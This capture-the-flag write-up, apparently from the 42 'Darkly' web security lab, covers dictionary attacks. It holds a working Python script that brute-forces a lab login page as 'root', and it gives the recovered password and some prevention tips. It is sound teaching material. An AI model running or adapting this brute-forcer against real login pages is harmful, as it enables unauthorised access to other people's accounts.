# Bruteforce Attack (here Dictionary Attack)

## Description
A brute force attack involves systematically trying all possible combinations of passwords until the correct one is found. Here we used a specific attack called Dictionary Attack. This attack uses a list of common passwords to try to gain unauthorized access to a system.

## BornToSec
First, its good to know that usually, every system has a superuser account named `root` or `admin` with a default password. So I tried to log in with the username `root` and decided to use a dictionary attack to find the password.

Here is the algorithm I used:
```python
import requests
from termcolor import colored

url = "http://10.11.249.222/?page=signin"
username = "root"
password_file = "/Users/nesta/Desktop/42/darkly/Bruteforce/Ressources/passwords.txt"
login_failed_string = "images/WrongAnswer.gif"


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		response = requests.get(url, params={'username':username,'password':password,'Login':'Login'})
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()



print('[*] Bruteforcing Against ' + url)
print('[*] Using Username: ' + username)
print('[*] Using Password File: ' + password_file)

with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')
```

Then you just need to go on the website and try to log in with the username `root` and the password that has been found with the algorithm here `shadow` to get the flag.

## How to prevent it
- Enforce Strong Password Policies: Require complex passwords with a mix of uppercase, lowercase, numbers, and special characters.
- Implement Account Lockout Mechanisms: Lock accounts after a certain number of failed login attempts (e.g., 3-5 attempts).
- Monitor and Block Suspicious IPs: Use tools to detect and block IP addresses that exhibit suspicious behavior.
- Avoid Default Usernames: Rename default administrative accounts like “root” to something less predictable.